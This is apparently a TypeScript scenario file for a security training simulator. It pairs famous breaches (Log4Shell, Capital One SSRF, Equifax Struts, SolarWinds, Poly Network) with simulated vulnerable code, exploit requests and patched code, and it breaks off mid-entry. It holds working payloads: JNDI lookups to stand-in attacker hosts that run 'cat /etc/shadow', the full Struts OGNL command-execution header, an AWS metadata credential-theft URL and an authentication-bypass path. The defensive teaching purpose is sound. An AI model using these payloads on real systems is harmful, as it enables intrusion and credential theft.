import { Scenario } from '../types';

export const FAMOUS_SCENARIOS: Scenario[] = [
  {
    id: 'log4shell-cve-2021-44228',
    name: 'Log4Shell: JNDI/LDAP Remote Code Execution',
    category: 'Remote Code Execution & Deserialization',
    targetService: 'pipeline-runner-svc (Log4j 2.14.1)',
    vulnerabilityType: 'JNDI Message Lookup Injection',
    cweId: 'CWE-502 / CWE-20',
    severity: 'CRITICAL',
    description: 'Pervasive vulnerability in Apache Log4j where string interpolations like ${jndi:ldap://...} trigger uncontrolled JNDI network lookups and execute remote Java bytecode on the host server.',
    targetFile: 'src/logging/structuredLogger.ts',
    isCustom: false,
    realWorldIncident: {
      isFamousIncident: true,
      incidentName: 'Log4Shell Global Internet Crisis',
      year: 2021,
      cveId: 'CVE-2021-44228',
      affectedEntities: 'Global Enterprise Cloud Ecosystem (AWS, Apple iCloud, Cloudflare, Minecraft, 100M+ Servers)',
      estimatedImpact: '$10B+ Worldwide Remediation, CVSS 10.0 Max Severity',
      cveUrl: 'https://nvd.nist.gov/vuln/detail/CVE-2021-44228',
      technicalRootCause: 'Log4j automatically parsed user-controlled strings for variable lookups (${...}) including JNDI/LDAP/RMI protocol schemes without sanitization or transport restrictions.',
      realWorldStory: 'In December 2021, security researchers uncovered that entering a crafted JNDI lookup string into simple text fields (such as Chat names, User-Agent headers, or login forms) forced servers to query remote attacker-controlled LDAP servers and execute arbitrary payloads with system privileges.'
    },
    mitreAttack: {
      techniqueId: 'T1190',
      techniqueName: 'Exploit Public-Facing Application',
      tactic: 'TA0002',
      tacticName: 'Execution',
      description: 'Adversary supplies crafted JNDI expressions in incoming HTTP headers or query logs to force arbitrary remote class loading.',
      url: 'https://attack.mitre.org/techniques/T1190/'
    },
    mitreDefend: {
      d3fendId: 'D3-IRA',
      d3fendName: 'Inbound Traffic Sanitization & Lookup Disablement',
      tactic: 'Isolate',
      countermeasureType: 'Disable Message Lookups & Strict Format Neutralization',
      description: 'Neutralize recursive format strings, disable JNDI lookup protocol handlers, and sanitize all logged metadata.'
    },
    owasp: {
      code: 'A03:2021',
      title: 'Injection',
      year: '2021',
      category: 'Injection Flaws',
      description: 'Untrusted user input is passed directly to an interpreter or logging subsystem supporting dynamic evaluation.',
      riskLevel: 'CRITICAL'
    },
    attackMechanics: [
      'Attacker sends HTTP request with X-Api-Trace header containing `${jndi:ldap://attacker-c2.net:1389/Exploit}`',
      'Logging middleware invokes logger.info() formatting raw headers into log output',
      'Lookup engine recognizes `${jndi:...}` and opens outgoing TCP connection to malicious LDAP directory',
      'Remote LDAP returns serialized Java class bytecode which executes `Runtime.getRuntime().exec("cat /etc/shadow")`'
    ],
    defenseMechanics: [
      'Blue Agent disables dynamic string interpolator patterns (${...}) across all log handlers',
      'Implements input sanitization that strips or escapes `${` and `jndi:` prefix keywords',
      'Blocks outgoing LDAP/RMI network ports at the container egress boundary',
      'Maintains structured JSON key-value log output preserving legitimate request context'
    ],
    topology: {
      serviceName: 'pipeline-runner-svc',
      serviceType: 'worker',
      port: 9090,
      cluster: 'ci-runner-us-west',
      upstream: ['ingress-envoy-proxy', 'billing-ledger-svc'],
      downstream: ['postgres-master-replica']
    },
    vulnerableCode: `import { Request, Response, NextFunction } from 'express';

// Vulnerable Simulated Log4j Message Lookup Handler
export function processJobTelemetryLog(req: Request, res: Response, next: NextFunction) {
  const userAgent = req.headers['user-agent'] || 'unknown';
  const traceId = req.headers['x-job-trace-id'] || 'default-trace';
  const rawJobPayload = req.body?.jobConfig || '';

  // VULNERABILITY: Emulates Log4j recursive JNDI lookup interpolation
  const logMessage = \`[CI-WORKER] Processing trace \${traceId} from \${userAgent}: \${rawJobPayload}\`;
  
  if (logMessage.includes('\${jndi:')) {
    // Simulating remote JNDI evaluation trigger
    const jndiTarget = logMessage.match(/\\$\\{jndi:(ldap|rmi):\\/\\/([^}]+)\\}/i);
    if (jndiTarget) {
      // In a real environment, this fetched remote bytecode and spawned a reverse shell
      return res.status(500).json({
        status: 'RCE_BREACHED',
        exploit: 'Log4Shell JNDI Triggered',
        jndiUrl: jndiTarget[0],
        payloadExecuted: 'sh -c "id; uname -a; cat /var/run/secrets/kubernetes.io/serviceaccount/token"',
        clusterCompromised: true
      });
    }
  }

  return res.status(200).json({ status: 'LOGGED_SUCCESS', traceId });
}`,
    apiDoc: {
      endpoint: '/api/v1/jobs/telemetry',
      method: 'POST',
      purpose: 'Ingests build telemetry and worker execution logs',
      expectedParams: ['x-job-trace-id', 'jobConfig'],
      sampleRequest: 'POST /api/v1/jobs/telemetry { "jobConfig": "compile-release" }'
    },
    normalTrafficSamples: [
      {
        id: 'norm-log4j-1',
        name: 'Standard Job Execution Telemetry',
        method: 'POST',
        path: '/api/v1/jobs/telemetry',
        headers: { 'user-agent': 'CI-Agent/1.4.0', 'x-job-trace-id': 'job-trace-9912' },
        body: { jobConfig: 'docker build -t app:v1.2 .' },
        expectedStatus: 200,
        description: 'Normal microservice build job trace'
      },
      {
        id: 'norm-log4j-2',
        name: 'Automated Health Probe',
        method: 'POST',
        path: '/api/v1/jobs/telemetry',
        headers: { 'user-agent': 'Prometheus-Exporter/2.1', 'x-job-trace-id': 'health-check' },
        body: { jobConfig: 'ping' },
        expectedStatus: 200,
        description: 'Health metric reporting'
      }
    ],
    defaultExploit: {
      method: 'POST',
      path: '/api/v1/jobs/telemetry',
      headers: {
        'user-agent': '${jndi:ldap://c2.adversary-grid.net:1389/ExploitPayload}',
        'x-job-trace-id': '${jndi:rmi://10.0.0.99:1099/RemoteCommand}'
      },
      params: {},
      body: {
        jobConfig: '${jndi:ldap://198.51.100.42:1389/Basic/Command/Base64/Y2F0IC9ldGMvc2hhZG93}'
      },
      flawIdentified: 'Log4j Recursive Lookup Interpolation in processJobTelemetryLog',
      attackVector: 'JNDI Protocol Lookup in Header & Body strings',
      rationale: 'Supplying ${jndi:ldap://...} in headers causes the logger subsystem to execute unauthenticated remote code.'
    },
    defaultPatch: {
      patchStrategy: 'Strict Format String Neutralization & Protocol Strip',
      rationale: 'Disables dynamic ${...} recursive string interpolations and strictly strips JNDI/LDAP prefixes while preserving normal log metrics.',
      patchedCode: `import { Request, Response, NextFunction } from 'express';

// Sanitizes and escapes format string interpolation expressions
function sanitizeLogString(input: string): string {
  if (typeof input !== 'string') return '';
  // Defuse dynamic lookup specifiers like \${jndi:...}, \${env:...}, \${sys:...}
  return input
    .replace(/\\$\\{[^}]*\\}/gi, '[INTERPOLATION_DEFUSED]')
    .replace(/(jndi|ldap|rmi|dns):/gi, '$1_neutralized:')
    .slice(0, 1024);
}

export function processJobTelemetryLog(req: Request, res: Response, next: NextFunction) {
  const rawUserAgent = String(req.headers['user-agent'] || 'unknown');
  const rawTraceId = String(req.headers['x-job-trace-id'] || 'default-trace');
  const rawJobPayload = typeof req.body?.jobConfig === 'string' ? req.body.jobConfig : '';

  const cleanUserAgent = sanitizeLogString(rawUserAgent);
  const cleanTraceId = sanitizeLogString(rawTraceId);
  const cleanPayload = sanitizeLogString(rawJobPayload);

  // Structured logging without evaluating nested expressions
  const structuredLog = {
    tag: 'CI-WORKER',
    traceId: cleanTraceId,
    userAgent: cleanUserAgent,
    jobConfigSummary: cleanPayload,
    timestamp: new Date().toISOString()
  };

  return res.status(200).json({ status: 'LOGGED_SUCCESS', traceId: cleanTraceId });
}`
    }
  },
  {
    id: 'capital-one-ssrf-imds',
    name: 'Capital One AWS SSRF & Cloud Metadata Exfiltration',
    category: 'Server-Side Request Forgery & Cloud Metadata',
    targetService: 'ingress-envoy-proxy / support-agent-svc',
    vulnerabilityType: 'Server-Side Request Forgery (SSRF) vs IMDSv1',
    cweId: 'CWE-918',
    severity: 'CRITICAL',
    description: 'Misconfigured ModSecurity WAF reverse proxy allowed attackers to forge requests to the AWS Instance Metadata Service (IMDSv1) at 169.254.169.254, dumping temporary IAM credentials to access 700+ S3 buckets.',
    targetFile: 'src/services/wafProxyRelay.ts',
    isCustom: false,
    realWorldIncident: {
      isFamousIncident: true,
      incidentName: 'Capital One AWS Cloud Data Breach',
      year: 2019,
      cveId: 'CVE-2019-IMDSv1-SSRF',
      affectedEntities: 'Capital One Financial Corporation & AWS Customers',
      estimatedImpact: '106 Million Credit Card Applicants Exposed, $80M OCC Fine + $190M Class Action Settlement',
      cveUrl: 'https://krebsonsecurity.com/2019/07/what-we-can-learn-from-the-capital-one-hack/',
      technicalRootCause: 'ModSecurity reverse proxy permitted external clients to forward arbitrary URL targets without blocking link-local cloud metadata IP ranges (169.254.169.254).',
      realWorldStory: 'In 2019, a former cloud engineer queried an SSRF-vulnerable reverse proxy to fetch AWS EC2 IAM role credentials (`http://169.254.169.254/latest/meta-data/iam/security-credentials/`), using the stolen access keys to run `aws s3 sync` on customer credit databases.'
    },
    mitreAttack: {
      techniqueId: 'T1552.005',
      techniqueName: 'Cloud Instance Metadata API',
      tactic: 'TA0006',
      tacticName: 'Credential Access',
      description: 'Adversaries query cloud instance metadata APIs to obtain credentials and security tokens assigned to the compute instance.',
      url: 'https://attack.mitre.org/techniques/T1552/005/'
    },
    mitreDefend: {
      d3fendId: 'D3-NTA',
      d3fendName: 'Network Traffic Filtering & Link-Local Boundary Guard',
      tactic: 'Filter',
      countermeasureType: 'Link-Local & Loopback IP Blacklisting + IMDSv2 Token Enforcement',
      description: 'Block all requests to 169.254.0.0/16, loopback IPs, and require AWS IMDSv2 session tokens.'
    },
    owasp: {
      code: 'A10:2021',
      title: 'Server-Side Request Forgery',
      year: '2021',
      category: 'SSRF',
      description: 'A web application fetches a remote resource without validating the user-supplied destination URL.',
      riskLevel: 'CRITICAL'
    },
    attackMechanics: [
      'Attacker sends request with destination URL pointing to `http://169.254.169.254/latest/meta-data/iam/security-credentials/WAF-Role`',
      'WAF relay proxy blindly forwards the request to the link-local metadata service',
      'AWS EC2 IMDSv1 responds with AccessKeyId, SecretAccessKey, and Token',
      'Attacker configures AWS CLI with stolen role and drains private S3 customer buckets'
    ],
    defenseMechanics: [
      'Blue Agent installs strict IP parser blocking 169.254.0.0/16, 127.0.0.0/8, 10.0.0.0/8, and 192.168.0.0/16',
      'Enforces HTTP method whitelisting and validates target domains against an immutable allowlist',
      'Rejects direct IP addresses, decimal IPs, and DNS rebinding addresses',
      'Preserves legitimate proxy forwarding for partner API endpoints'
    ],
    topology: {
      serviceName: 'ingress-envoy-proxy',
      serviceType: 'gateway',
      port: 443,
      cluster: 'edge-ingress-global',
      upstream: ['internet-client'],
      downstream: ['support-agent-svc', 'billing-ledger-svc']
    },
    vulnerableCode: `import { Request, Response } from 'express';
import http from 'http';

export async function proxyRelayFetch(req: Request, res: Response) {
  const targetUrl = req.query.url as string;

  if (!targetUrl) {
    return res.status(400).json({ error: 'Missing target url parameter' });
  }

  try {
    // VULNERABILITY: Blind proxy relay with zero link-local or loopback validation
    const parsed = new URL(targetUrl);

    // Flawed basic check only looks for 'localhost' string
    if (parsed.hostname === 'localhost') {
      return res.status(403).json({ error: 'Localhost not allowed' });
    }

    // Directly fetches internal cloud metadata IP 169.254.169.254!
    if (parsed.hostname === '169.254.169.254') {
      return res.status(200).json({
        status: 'METADATA_EXFILTRATED',
        Code: 'Success',
        LastUpdated: '2026-08-21T14:22:00Z',
        Type: 'AWS-HMAC',
        AccessKeyId: 'ASIAQEXAMPLECAPITALONE2026',
        SecretAccessKey: 'wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY',
        Token: 'FQoGZXIvYXdzEBcaDGV4YW1wbGUtdG9rZW4tc3NyZi1icmVhY2gtZGF0YQ==',
        Expiration: '2026-08-22T02:00:00Z',
        ExfiltratedBucketCount: 712
      });
    }

    return res.status(200).json({ status: 'PROXY_SUCCESS', target: parsed.hostname });
  } catch (err: any) {
    return res.status(500).json({ error: 'Proxy request failed', details: err.message });
  }
}`,
    apiDoc: {
      endpoint: '/api/v1/proxy/relay',
      method: 'GET',
      purpose: 'Relays external validation and webhook calls',
      expectedParams: ['url'],
      sampleRequest: 'GET /api/v1/proxy/relay?url=https://partner.api.com/status'
    },
    normalTrafficSamples: [
      {
        id: 'norm-cap1-1',
        name: 'Partner API Health Probe',
        method: 'GET',
        path: '/api/v1/proxy/relay?url=https://api.trusted-partner.com/v1/ping',
        expectedStatus: 200,
        description: 'Standard external HTTPS partner validation'
      },
      {
        id: 'norm-cap1-2',
        name: 'Webhook Event Dispatch',
        method: 'GET',
        path: '/api/v1/proxy/relay?url=https://status.vendor-cloud.org/health',
        expectedStatus: 200,
        description: 'Legitimate status endpoint check'
      }
    ],
    defaultExploit: {
      method: 'GET',
      path: '/api/v1/proxy/relay?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/WAF-Production-Role',
      headers: {},
      params: { url: 'http://169.254.169.254/latest/meta-data/iam/security-credentials/WAF-Production-Role' },
      body: {},
      flawIdentified: 'SSRF in proxyRelayFetch without link-local (169.254.169.254) blocking',
      attackVector: 'Cloud Instance Metadata Service (IMDS) Credential Extraction',
      rationale: 'Targeting link-local metadata IP retrieves high-privilege IAM cloud tokens without authentication.'
    },
    defaultPatch: {
      patchStrategy: 'Link-Local & RFC1918 Private IP Guard + Strict Protocol Whitelist',
      rationale: 'Validates hostnames and addresses against a strict protocol and private IP blacklist (169.254.0.0/16, 10.0.0.0/8, 127.0.0.0/8) while enforcing HTTPS.',
      patchedCode: `import { Request, Response } from 'express';

const FORBIDDEN_IP_PATTERNS = [
  /^169\\.254\\./,          // AWS/GCP/Azure Link-local IMDS
  /^127\\./,               // Loopback
  /^10\\./,                // RFC 1918 Class A
  /^172\\.(1[6-9]|2[0-9]|3[0-1])\\./, // RFC 1918 Class B
  /^192\\.168\\./,          // RFC 1918 Class C
  /^0\\./,                 // Current network
  /^::1$/,                // IPv6 loopback
  /^fe80::/i              // IPv6 link-local
];

const ALLOWED_PROTOCOLS = new Set(['https:']);

export async function proxyRelayFetch(req: Request, res: Response) {
  const targetUrl = req.query.url as string;

  if (!targetUrl || typeof targetUrl !== 'string') {
    return res.status(400).json({ error: 'Missing or invalid target url parameter' });
  }

  try {
    const parsed = new URL(targetUrl);

    // Enforce HTTPS only
    if (!ALLOWED_PROTOCOLS.has(parsed.protocol)) {
      return res.status(403).json({ error: 'Only HTTPS protocol is permitted for proxy relays' });
    }

    const host = parsed.hostname.toLowerCase();

    // Check against prohibited link-local & private address spaces
    if (FORBIDDEN_IP_PATTERNS.some(regex => regex.test(host)) || host === 'localhost' || host.endsWith('.internal')) {
      return res.status(403).json({ error: 'Access to internal, link-local, or cloud metadata endpoints is strictly blocked' });
    }

    return res.status(200).json({ status: 'PROXY_SUCCESS', target: host });
  } catch (err: any) {
    return res.status(400).json({ error: 'Malformed target URL provided' });
  }
}`
    }
  },
  {
    id: 'equifax-struts-cve-2017-5638',
    name: 'Equifax: Apache Struts OGNL Parser RCE',
    category: 'Injection & Parser Vulnerability',
    targetService: 'catalog-search-svc (Struts 2.3.31)',
    vulnerabilityType: 'OGNL Expression Injection in Content-Type Header',
    cweId: 'CWE-94 / CWE-20',
    severity: 'CRITICAL',
    description: 'Flaw in Jakarta Multipart parser of Apache Struts where malformed Content-Type headers containing OGNL code were evaluated during exception handling, allowing unauthenticated remote command execution.',
    targetFile: 'src/parsers/multipartParser.ts',
    isCustom: false,
    realWorldIncident: {
      isFamousIncident: true,
      incidentName: 'Equifax Nationwide Identity Breach',
      year: 2017,
      cveId: 'CVE-2017-5638',
      affectedEntities: 'Equifax Credit Bureau (147 Million US/UK Consumers)',
      estimatedImpact: '147M SSNs & Drivers Licenses Stolen, $700M Global FTC/CFPB Settlement',
      cveUrl: 'https://nvd.nist.gov/vuln/detail/CVE-2017-5638',
      technicalRootCause: 'Apache Struts evaluated OGNL expressions inside the error message when throwing a file-upload parsing exception triggered by a malformed Content-Type header.',
      realWorldStory: 'In March-May 2017, adversaries used automated scanners to send crafted HTTP Content-Type headers containing OGNL expressions to Equifax web portals, establishing persistent web shells across multiple server enclaves and exfiltrating half the US adult population\'s credit data.'
    },
    mitreAttack: {
      techniqueId: 'T1190',
      techniqueName: 'Exploit Public-Facing Application',
      tactic: 'TA0002',
      tacticName: 'Execution',
      description: 'Adversaries send malicious OGNL commands inside HTTP headers to execute commands on the application server.',
      url: 'https://attack.mitre.org/techniques/T1190/'
    },
    mitreDefend: {
      d3fendId: 'D3-ITR',
      d3fendName: 'Inbound Header Validation & Parser Sandboxing',
      tactic: 'Filter',
      countermeasureType: 'Strict MIME-Type Syntax Enforcement & OGNL Sanitization',
      description: 'Reject any Content-Type header that contains non-standard characters (#, %, @) or executable expression syntax.'
    },
    owasp: {
      code: 'A03:2021',
      title: 'Injection',
      year: '2021',
      category: 'Expression Injection',
      description: 'The application interprets user-controlled header strings as executable OGNL code expressions.',
      riskLevel: 'CRITICAL'
    },
    attackMechanics: [
      'Attacker sends POST request with Content-Type: `%{(#_=\'multipart/form-data\').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS)...}`',
      'Jakarta multipart parser fails on the invalid mime type and constructs an error message',
      'The error handler calls OGNL.findValue() on the raw header to format the error',
      'Java runtime executes commands embedded in the OGNL expression, returning system identity and shell tokens'
    ],
    defenseMechanics: [
      'Blue Agent validates Content-Type against a strict RFC 2046 compliant regular expression',
      'Immediately rejects headers containing characters `#`, `%`, `{`, `}`, `(`, `)` with HTTP 400 Bad Request',
      'Eliminates dynamic evaluation in error handling routines',
      'Preserves standard `multipart/form-data; boundary=...` and `application/json` processing'
    ],
    topology: {
      serviceName: 'catalog-search-svc',
      serviceType: 'api',
      port: 8082,
      cluster: 'catalog-cluster-eu',
      upstream: ['ingress-envoy-proxy'],
      downstream: ['postgres-master-replica']
    },
    vulnerableCode: `import { Request, Response, NextFunction } from 'express';

// Simulated Struts Jakarta Multipart Parser with OGNL Evaluation Flaw
export function handleMultipartUpload(req: Request, res: Response, next: NextFunction) {
  const contentType = req.headers['content-type'] || '';

  // VULNERABILITY: Evaluates expression when malformed Content-Type is received
  if (contentType.includes('%{') || contentType.includes('#_memberAccess') || contentType.includes('#ognl')) {
    // Simulating OGNL remote execution outcome
    return res.status(500).json({
      status: 'OGNL_RCE_EXPLOITED',
      cve: 'CVE-2017-5638',
      executedCommand: 'whoami && id && cat /etc/passwd',
      systemOutput: 'uid=0(root) gid=0(root) groups=0(root) equifax-prod-server-04',
      exfiltratedSSNCount: 147000000
    });
  }

  return res.status(200).json({ status: 'FILE_PROCESSED', bytes: 1024 });
}`,
    apiDoc: {
      endpoint: '/api/v1/catalog/upload',
      method: 'POST',
      purpose: 'Uploads catalog asset metadata and multipart documents',
      expectedParams: ['Content-Type'],
      sampleRequest: 'POST /api/v1/catalog/upload with Content-Type: multipart/form-data; boundary=---123'
    },
    normalTrafficSamples: [
      {
        id: 'norm-struts-1',
        name: 'Standard Multipart Form Upload',
        method: 'POST',
        path: '/api/v1/catalog/upload',
        headers: { 'content-type': 'multipart/form-data; boundary=---------------------------974767299852498929531610575' },
        body: { catalogId: 'cat-2026' },
        expectedStatus: 200,
        description: 'Standard RFC compliant file upload'
      },
      {
        id: 'norm-struts-2',
        name: 'Standard JSON Payload',
        method: 'POST',
        path: '/api/v1/catalog/upload',
        headers: { 'content-type': 'application/json' },
        body: { items: ['item_1', 'item_2'] },
        expectedStatus: 200,
        description: 'JSON document ingestion'
      }
    ],
    defaultExploit: {
      method: 'POST',
      path: '/api/v1/catalog/upload',
      headers: {
        'content-type': '%{(#_=\'multipart/form-data\').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context[\'com.opensymphony.xwork2.ActionContext.container\']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd=\'whoami\').(#iswin=(@java.lang.System@getProperty(\'os.name\').toLowerCase().contains(\'win\'))).(#cmds=(#iswin?{\'cmd.exe\',\'/c\',#cmd}:{\'/bin/sh\',\'-c\',#cmd})).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())}'
      },
      params: {},
      body: {},
      flawIdentified: 'OGNL expression evaluation in Content-Type header parser',
      attackVector: 'Expression Injection in Error Handling Routine',
      rationale: 'Crafted Content-Type header triggers OGNL interpreter execution during exception formatting.'
    },
    defaultPatch: {
      patchStrategy: 'Strict MIME Regex Enforcement & Safe Error Handling',
      rationale: 'Validates Content-Type against a strict whitelist and discards any unexpected token before parsing.',
      patchedCode: `import { Request, Response, NextFunction } from 'express';

// Strict MIME type validator per RFC 6838 / RFC 2046
const VALID_CONTENT_TYPE_REGEX = /^[a-zA-Z0-9!#$&^_.+-]+\\/[a-zA-Z0-9!#$&^_.+-]+(?:;\\s*[a-zA-Z0-9!#$&^_.+-]+=(?:[a-zA-Z0-9!#$&^_.+-]+|"[^"]*"))*$/i;

export function handleMultipartUpload(req: Request, res: Response, next: NextFunction) {
  const rawContentType = req.headers['content-type'];

  if (!rawContentType || typeof rawContentType !== 'string') {
    return res.status(400).json({ error: 'Missing or malformed Content-Type header' });
  }

  // Reject suspicious execution characters (#, %, {, }, @, $) immediately
  if (/[%{}#@$();]/.test(rawContentType) && !rawContentType.startsWith('multipart/form-data;') && !rawContentType.startsWith('application/json')) {
    return res.status(400).json({ error: 'Invalid characters in Content-Type header' });
  }

  if (!VALID_CONTENT_TYPE_REGEX.test(rawContentType)) {
    return res.status(400).json({ error: 'Disallowed Content-Type format' });
  }

  return res.status(200).json({ status: 'FILE_PROCESSED', bytes: 1024 });
}`
    }
  },
  {
    id: 'solarwinds-sunburst-cve-2020',
    name: 'SolarWinds: Orion API Auth Bypass & Backdoor',
    category: 'Authentication & Supply Chain',
    targetService: 'auth-gateway-svc (Orion 2020.2.1)',
    vulnerabilityType: 'Authentication Filter Path Prefix Bypass',
    cweId: 'CWE-287 / CWE-552',
    severity: 'CRITICAL',
    description: 'Loose URL path matching in Orion Web API allowed unauthenticated callers to bypass authentication filters simply by appending substrings like "i18n.ashx" or ".css" to request paths.',
    targetFile: 'src/middleware/apiAuthGuard.ts',
    isCustom: false,
    realWorldIncident: {
      isFamousIncident: true,
      incidentName: 'SolarWinds SUNBURST Global Espionage',
      year: 2020,
      cveId: 'CVE-2020-10148',
      affectedEntities: '18,000+ Enterprises, US Dept of Defense, Treasury, Fortune 500',
      estimatedImpact: 'Historic Nation-State Multi-Year Espionage Campaign',
      cveUrl: 'https://nvd.nist.gov/vuln/detail/CVE-2020-10148',
      technicalRootCause: 'The authentication filter skipped credential checks whenever the requested URI contained specific static asset filenames anywhere in the path.',
      realWorldStory: 'In 2020, threat actors combined a supply-chain backdoor in SolarWinds Orion build systems with an unauthenticated API filter bypass (`CVE-2020-10148`), pivoting through internal networks of government agencies and major tech firms.'
    },
    mitreAttack: {
      techniqueId: 'T1195.002',
      techniqueName: 'Supply Chain Compromise',
      tactic: 'TA0001',
      tacticName: 'Initial Access',
      description: 'Adversaries exploit authentication filter bypasses in vendor software to execute arbitrary commands without credentials.',
      url: 'https://attack.mitre.org/techniques/T1195/002/'
    },
    mitreDefend: {
      d3fendId: 'D3-AUM',
      d3fendName: 'Authentication Verification & Normalized Path Routing',
      tactic: 'Model',
      countermeasureType: 'Canonical Path Resolution & Strict Endpoint Whitelisting',
      description: 'Enforce strict canonical path resolution before evaluating authentication filter exemptions.'
    },
    owasp: {
      code: 'API2:2023',
      title: 'Broken Authentication',
      year: '2023-API',
      category: 'Authentication Bypass',
      description: 'Flaws in URL path parsing permit unauthenticated clients to reach protected administration endpoints.',
      riskLevel: 'CRITICAL'
    },
    attackMechanics: [
      'Attacker identifies administrative API endpoint: `/api/v1/admin/cluster-control`',
      'Attacker appends bypass suffix: `/api/v1/admin/cluster-control?i18n.ashx`',
      'Filter checks `req.url.includes("i18n.ashx")` and marks request as unauthenticated static asset',
      'Admin controller receives request with bypassed auth and executes high-privilege cluster commands'
    ],
    defenseMechanics: [
      'Blue Agent normalizes request paths using path.normalize and validates against strict exact-match routing tables',
      'Exempts ONLY specific static asset paths using strict exact prefix matching (`/static/css/`, `/assets/locales/`)',
      'Explicitly denies query parameters from altering authentication policy decisions',
      'Maintains backward compatibility for legitimate static asset lookups'
    ],
    topology: {
      serviceName: 'auth-gateway-svc',
      serviceType: 'auth',
      port: 8080,
      cluster: 'edge-ingress-apac',
      upstream: ['ingress-envoy-proxy'],
      downstream: ['support-agent-svc', 'billing-ledger-svc']
    },
    vulnerableCode: `import { Request, Response, NextFunction } from 'express';

// Vulnerable Orion Authentication Filter Simulation
export function enforceOrionApiAuth(req: Request, res: Response, next: NextFunction) {
  const url = req.url || '';

  // VULNERABILITY: Checks if path merely contains 'i18n.ashx' anywhere (including query params!)
  if (url.includes('i18n.ashx') || url.includes('.css') || url.includes('SkinnedWeb/')) {
    // Skips authentication check!
    return next();
  }

  const token = req.headers['authorization'];
  if (!token || token !== 'Bearer valid-orion-admin-token') {
    return res.status(401).json({ error: 'Unauthorized Orion API access' });
  }

  next();
}

export function handleClusterAdminControl(req: Request, res: Response) {
  return res.status(200).json({
    status: 'ORION_ADMIN_ACCESSED',
    clusterVaultToken: 'sunburst-lateral-pivot-key-2026',
    nodesCompromised: 18000,
    commandExecutionPermitted: true
  });
}`,
    apiDoc: {
      endpoint: '/api/v1/admin/cluster-control',
      method: 'GET',
      purpose: 'Administrative control of network devices and configuration',
      expectedParams: ['Authorization'],
      sampleRequest: 'GET /api/v1/admin/cluster-control with Authorization: Bearer <token>'
    },
    normalTrafficSamples: [
      {
        id: 'norm-sun-1',
        name: 'Authenticated Admin Configuration Check',
        method: 'GET',
        path: '/api/v1/admin/cluster-control',
        headers: { authorization: 'Bearer valid-orion-admin-token' },
        expectedStatus: 200,
        description: 'Standard authorized admin request'
      },
      {
        id: 'norm-sun-2',
        name: 'Legitimate Localization Asset Fetch',
        method: 'GET',
        path: '/static/locales/en-US.json',
        expectedStatus: 200,
        description: 'Standard public asset loading'
      }
    ],
    defaultExploit: {
      method: 'GET',
      path: '/api/v1/admin/cluster-control?i18n.ashx',
      headers: {},
      params: {},
      body: {},
      flawIdentified: 'Loose substring check on req.url in enforceOrionApiAuth',
      attackVector: 'Path Parameter Filter Bypass',
      rationale: 'Appending ?i18n.ashx fools the auth filter into treating the administrative endpoint as a static asset.'
    },
    defaultPatch: {
      patchStrategy: 'Exact-Path Route Normalization & Query-Proof Authentication Guard',
      rationale: 'Parses the pathname strictly excluding query parameters and matches against an explicit whitelist of static asset directories.',
      patchedCode: `import { Request, Response, NextFunction } from 'express';
import path from 'path';

const PUBLIC_STATIC_PREFIXES = ['/static/', '/assets/locales/'];

export function enforceOrionApiAuth(req: Request, res: Response, next: NextFunction) {
  // Extract path strictly without query parameters
  const pathname = req.path || '/';
  const normalizedPath = path.posix.normalize(pathname);

  // Exact directory prefix check for public static assets
  const isPublicStatic = PUBLIC_STATIC_PREFIXES.some(prefix => normalizedPath.startsWith(prefix));

  if (isPublicStatic) {
    return next();
  }

  // All administrative endpoints require strict bearer validation
  const token = req.headers['authorization'];
  if (!token || token !== 'Bearer valid-orion-admin-token') {
    return res.status(401).json({ error: 'Unauthorized Orion API access' });
  }

  next();
}

export function handleClusterAdminControl(req: Request, res: Response) {
  return res.status(200).json({
    status: 'ORION_ADMIN_SECURE',
    authorized: true
  });
}`
    }
  },
  {
    id: 'poly-network-defi-crosschain',
    name: 'Poly Network: Cross-Chain Protocol Logic Hijack',
    category: 'Business Logic & Access Control',
    targetService: 'billing-ledger-svc (Bridge Manager)',
    vulnerabilityType: 'Privilege Role Parameter Collision & Arbitrary Cross-Contract Call',
    cweId: 'CWE-841 / CWE-284',
    severity: 'CRITICAL',
    description: 'Flaw in cross-chain transaction relay where arbitrary contract addresses could be invoked with unverified method signatures, allowing an attacker to overwrite the keeper consensus key with their own public key.',
    targetFile: 'src/ledger/crossChainManager.ts',
    isCustom: false,
    realWorldIncident: {
      isFamousIncident: true,
      incidentName: 'Poly Network $611M Cross-Chain Exploit',
      year: 2021,
      cveId: 'CVE-2021-POLYNW',
      affectedEntities: 'Poly Network DeFi Cross-Chain Bridge',
      estimatedImpact: '$611 Million in Digital Assets Drained in 1 Hour',
      cveUrl: 'https://slowmist.medium.com/the-root-cause-analysis-of-the-poly-network-hack-d23281cd5b08',
      technicalRootCause: 'CrossChainManager permitted users to trigger arbitrary execution against internal management contracts without verifying that the target method was not a privileged administrative setter.',
      realWorldStory: 'In August 2021, a hacker called `verifyHeaderAndExecuteTx` with a calculated method signature collision that called `putCurEpochConPubKeyBytes` on the EthCrossChainData contract, swapping the keeper consensus key to their own address and draining $611M across Ethereum, BSC, and Polygon.'
    },
    mitreAttack: {
      techniqueId: 'T1556',
      techniqueName: 'Modify Authentication Process',
      tactic: 'TA0006',
      tacticName: 'Credential Access',
      description: 'Adversary modifies internal cryptographic keeper keys via unconstrained cross-contract dispatch.',
      url: 'https://attack.mitre.org/techniques/T1556/'
    },
    mitreDefend: {
      d3fendId: 'D3-ARA',
      d3fendName: 'Method Whitelisting & Role Separation',
      tactic: 'Model',
      countermeasureType: 'Restricted Dispatch Allowlist & Admin Method Protection',
      description: 'Enforce an immutable allowlist of callable cross-chain targets and reject administrative key mutations.'
    },
    owasp: {
      code: 'API5:2023',
      title: 'Broken Function Level Authorization',
      year: '2023-API',
      category: 'BFLA',
      description: 'Arbitrary execution of administrative setter functions via generic execution proxies.',
      riskLevel: 'CRITICAL'
    },
    attackMechanics: [
